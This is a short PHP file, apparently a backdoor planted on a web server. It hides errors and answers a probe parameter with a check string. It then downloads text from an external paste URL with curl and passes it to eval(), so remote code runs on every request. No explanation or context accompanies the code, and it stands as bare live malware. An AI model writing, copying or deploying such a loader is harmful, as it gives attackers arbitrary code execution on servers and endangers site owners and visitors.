<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$ok = '?>';
      eval("$ok" . get('https://paste.myconan.net/495929.txt'));
?>